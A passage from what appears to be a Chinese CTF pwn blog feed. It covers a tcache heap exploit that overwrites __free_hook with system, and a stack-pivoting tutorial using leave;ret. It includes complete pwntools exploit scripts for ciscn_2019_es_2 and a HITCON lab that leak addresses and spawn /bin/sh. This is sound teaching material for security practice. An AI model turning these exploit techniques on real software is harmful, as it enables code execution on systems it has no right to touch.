class="comment">##此时tcachebins为空，当再次申请chunk会将fastbins的chunk放入tcachebins中</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(heap+<span class="number">0x10</span>))<span class="comment">#16</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#18</span></span><br><span class="line"><span class="comment">##设置tcache_perthread_struct chunk的size对应的tcachebins为0xff，即让系统认为tcachebins中这个size处，已经满了</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">add(<span class="number">0x68</span>,payload)<span class="comment">#19</span></span><br><span class="line">show(<span class="number">19</span>)</span><br><span class="line">delete(<span class="number">19</span>)</span><br><span class="line">show(<span class="number">19</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">data =  uu64(r(<span class="number">6</span>))</span><br><span class="line">lg(<span class="string">&#x27;main_arena+96&#x27;</span>,data)</span><br><span class="line">libc_base = data - <span class="number">96</span> - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"><span class="comment">##malloc出来tcache_perthread_struct chunk使用去修改tcache_entry指针实现任意malloc</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x40</span>+p64(libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">8</span>))<span class="comment">#20</span></span><br><span class="line"><span class="comment">##这段代码就是改tcachebins的0x20处的next指针指向__free_hook</span></span><br><span class="line"><span class="comment">##申请出上面这个0x20大小的chunk，改__free_hook为system</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))<span class="comment">#21</span></span><br><span class="line"><span class="comment">##b&#x27;/bin/sh\x00&#x27;覆盖了libc_base+libc.sym[&#x27;__free_hook&#x27;]-8，system覆盖了__free_hook</span></span><br><span class="line">delete(<span class="number">21</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<ol>
<li>tcache中的偏移，与存放chunk_size的大小</li>
</ol>
<p>疑问一：为什么这里<code>payload = b&#39;\x00&#39;*0x23+b&#39;\xff&#39;</code></p>
<p>在此处pwndbg中，tcache_prethread_struct的chunk内存，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x555555606000</span><br><span class="line">0x555555606000: 0x0000000000000000      0x0000000000000251</span><br><span class="line">0x555555606010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606030: 0x00000000ff000000      0x0000000000000000</span><br><span class="line">0x555555606040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606070: 0x0000000000000000      0x0000010000000000</span><br><span class="line">0x555555606080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="comment">#前面这一块内存记录的是tcachebins中对应size的chunk的数量，在0xff前面有0x23个\x00,它们记录了从0x10 - 0x240size的chunk，0xff的位置记录的是0x250大小的chunk,由于0xff导致0x250[-1]，以至于系统认为此处的chunk已满</span></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x70 [  0]: 0x10000000000</span><br><span class="line">0x250 [ -1]: 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//关于这个前0x40的内存，这里可以参考源码：</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];<span class="comment">//64 = 0x40</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//后面的就是tcache_entry,即每个tcachebins中记录的chunk_memptr</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>



<p>疑问二：<code>b&#39;\x00&#39;*0x40+p64(libc_base+libc.sym[&#39;__free_hook&#39;]-8)</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x555555606000</span><br><span class="line">0x555555606000: 0x0000000000000000      0x0000000000000101</span><br><span class="line">0x555555606010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606040: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="comment">#前面这些应该是记录tcachebins中每个size对应chunk的数量</span></span><br><span class="line"><span class="comment">#从这里开始往下应该是记录了每个size的chunk_memptr,最小的是0x20</span></span><br><span class="line">0x555555606050: 0x00007ffff7fc65a0      0x0000000000000000</span><br><span class="line">0x555555606060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606070: 0x0000000000000000      0x0000010000000000</span><br><span class="line">0x555555606080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060a0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><p>ctf-wiki，<a href="https://nightrainy.github.io/">知世</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>栈迁移</title>
    <url>/2025/03/21/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
    <content><![CDATA[<p>本文讨论的原理，都是针对于32位程序的栈迁移来说的，例题里面有一道是64位的栈迁移</p>
<h3 id="1、什么是栈迁移"><a href="#1、什么是栈迁移" class="headerlink" title="1、什么是栈迁移"></a>1、什么是栈迁移</h3><p> 这里我谈谈自己的理解，简单一句话：<strong>栈迁移就是控制程序的执行流</strong>（这个换的地方既可以是bss段也可以是栈里面），此时新的问题随之产生，为什么要换个地方GetShell，这就是下一段要说的为什么要使用栈迁移。</p>
<h3 id="2、为什么要使用栈迁移-什么时候该使栈迁移（使用栈迁移的条件）"><a href="#2、为什么要使用栈迁移-什么时候该使栈迁移（使用栈迁移的条件）" class="headerlink" title="2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）"></a>2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）</h3><p>言简意赅的来说，就是可溢出的长度不够用，也就是说我们要么是没办法溢出到返回地址只能溢出覆盖ebp，要么是刚好溢出覆盖了返回地址但是受payload长度限制，没办法把参数给写到返回地址后面。总之呢，就是能够溢出的长度不够，没办法GetShell，所以我们才需要换一个地方GetShell。</p>
<p> 使用栈迁移的条件：</p>
<ul>
<li>要能够溢出</li>
<li>有个可写的地方（就是你要GetShell的地方），先考虑bss段，最后再考虑写到栈中</li>
<li>可以控制sp寄存器</li>
</ul>
<h3 id="3、学习栈迁移需要自身掌握什么知识"><a href="#3、学习栈迁移需要自身掌握什么知识" class="headerlink" title="3、学习栈迁移需要自身掌握什么知识"></a>3、学习栈迁移需要自身掌握什么知识</h3><ul>
<li>需要掌握汇编基础</li>
<li>较为熟悉栈结构</li>
<li>熟悉函数调用与结束时栈的变化。</li>
</ul>
<p>如果掌握了这些知识，那么理解下面的内容就不会太费力气了。当然如果你会用gdb进行调试的话，通过自己的动手调试，你将理解的更为透彻。如果你和我当初一样，也是对栈迁移一无所知，那么希望你可以仔细阅读下面的内容，我会帮你彻底理解它。</p>
<h3 id="4、栈迁移的原理"><a href="#4、栈迁移的原理" class="headerlink" title="4、栈迁移的原理"></a>4、栈迁移的原理</h3><h5 id="ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系），以下图为例"><a href="#ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系），以下图为例" class="headerlink" title="ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系），以下图为例"></a>ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系），以下图为例</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0e:0038│ ebp 0xffffd0c8 —▸ 0xffffd0d8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0</span><br></pre></td></tr></table></figure>



<p> ebp是0xffffd0c8，它的内容是0xffffd0d8，而这个内容也是一个地址，这个地址里面装的又是0xf7ffd020。ebp本身大部分时候都是一个地址（程序正常运行情况下），而ebp的内容可以是地址，也可以不是地址（程序正常运行下，ebp的内容也装的是地址，但如果你进行溢出的话，自然可以不装成地址）。我这里想强调的是<em><strong>ebp和ebp的内容这两者一定不能混为一谈</strong></em>，在阅读下面的内容是，一定要注意区分两者。</p>
<h3 id="栈迁移的核心，就在于两次的leave-ret指令上面"><a href="#栈迁移的核心，就在于两次的leave-ret指令上面" class="headerlink" title="栈迁移的核心，就在于两次的leave;ret指令上面"></a><strong>栈迁移的核心，就在于两次的leave;ret指令上面</strong></h3><p> leave指令即为mov esp ebp;pop ebp先将ebp赋给esp，此时esp与ebp位于了一个地址，你可以现在把它们指向的那个地址，即当成栈顶又可以当成是栈底。然后pop ebp，将<strong>栈顶的内容</strong>弹入ebp（此时栈顶的内容也就是ebp的内容，也就是说现在把ebp的内容赋给了ebp）。因为esp要时刻指向栈顶，既然栈顶的内容都弹走了，那么esp自然要往下挪一个内存单元。具体实现请见下图：</p>
<img data-src="../images/image-20241120213824271.png" alt="image-20241120213824271" style="zoom:50%;" />

<p> ret指令为pop eip，这个指令就是把栈顶的内容弹进了eip（就是下一条指令执行的地址）具体实现请见下图：</p>
<p><img data-src="/../images/2706180-20220118102755803-79970067.png" alt="2706180-20220118102755803-79970067"></p>
<p>若这个ret_address为<code>leave;ret</code>且<code>fake_frame</code>为我们精心构造的栈帧，就可以实现将esp寄存器也迁移到我们精心构造的栈帧，从而实现get_shell等操作，具体实现请见下图：</p>
<p><img data-src="/../images/image-20241120220941300.png" alt="image-20241120220941300"></p>
<p>栈迁移的例题有以下几种：</p>
<p>攻防世界上的greeting-150</p>
<p>BUUCTF上的[Black Watch 入群题]</p>
<p>BUUCTF上的ciscn_2019_es_2</p>
<p>BUUCTF上的gyctf_2020_borrowstack</p>
<p> 它们考察了在迁移到栈，迁移到bss段，从main函数结束时迁移，从main函数调用的函数结束时迁移，和64位的栈迁移以及ret2csu。</p>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>拖入ida中反编译如下，32位只有NX保护：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">hack</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>大概思路就是，我们要用第一个read来泄露下ebp的地址**（因为是printf来打印字符串，参数是%s，因此是遇见00才停止打印，只要我们第一次read正好输入0x28个字符，那就没有地方在填上00了（read读入之后，会自动补充00），因此就可以把下面的ebp地址给打印出来了）**，然后第二个read用来填充我们构造的system函数以及参数（我们这次是转移到了栈中，也就是第一次read读入s的地方），</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">                   <span class="comment">#bin_sh的指针         #填充够0x28 |  ebp    |    ret              </span></span><br><span class="line">|system@plt|p32(<span class="number">0</span>)|p32(buf+<span class="number">12</span>)|/<span class="built_in">bin</span>/sh\x00|\x00...|p32(buf-<span class="number">4</span>)|p32(leave_ret)</span><br></pre></td></tr></table></figure>

<p>参数分布参考上图</p>
<p>后面的p32(buf-4) + p32(leave) p32(buf-4) 是将ebp覆盖成buf的地址-4 为什么要-4？这是因为我们利用的是两个leave，但是第二个 leave的pop ebp，在出栈的时候会esp+4。就会指向esp+4的位置， p32(leave) ,将返回地址覆盖成leave 到这里，我们成功将栈劫持到了我们的buf处，接下来就会执行栈里的内容 完整exp见解题过程。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28649</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x08048562</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">38</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">2</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(<span class="string">b&#x27;aabb&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">lg(<span class="string">&quot;ebp&quot;</span>,ebp)</span><br><span class="line">sh = ebp-<span class="number">0x38</span>+<span class="number">16</span></span><br><span class="line">rop = flat([<span class="number">0</span>,elf.plt[<span class="string">&#x27;system&#x27;</span>],<span class="number">0</span>,sh,<span class="string">b&#x27;/bin&#x27;</span>,<span class="string">b&#x27;/sh\x00&#x27;</span>])</span><br><span class="line">payload = rop.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(ebp-<span class="number">0x38</span>) + p32(leave_ret)</span><br><span class="line">s(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<h2 id="hitcon-lab"><a href="#hitcon-lab" class="headerlink" title="hitcon lab"></a>hitcon lab</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;, arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;192.168.6.128&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x804ae00</span></span><br><span class="line">buf2 = buf+<span class="number">0x200</span></span><br><span class="line"><span class="comment">#这两个buf是data段靠后的那一块任取的	</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x08048504</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">rop = flat([buf,read_plt,leave_ret,<span class="number">0</span>,buf,<span class="number">0x100</span>])</span><br><span class="line">payload += rop</span><br><span class="line">s(payload)</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">pop1ret = <span class="number">0x0804836d</span></span><br><span class="line">rop2 = flat([buf2,elf.plt[<span class="string">&#x27;puts&#x27;</span>],pop1ret,elf.got[<span class="string">&#x27;puts&#x27;</span>],read_plt,leave_ret,<span class="number">0</span>,buf2,<span class="number">0x100</span>])</span><br><span class="line">sl(rop2)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">puts = u32(p.recvline().strip())</span><br><span class="line">lg(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">libc_base = puts - <span class="number">0x732a0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system = libc_base + <span class="number">0x48170</span></span><br><span class="line">sh = buf2 + <span class="number">16</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">rop3 = flat([buf,system,<span class="number">0</span>,sh,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>])</span><br><span class="line">sl(rop3)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>stack</tag>
      </tags>
  </entry>
</search>
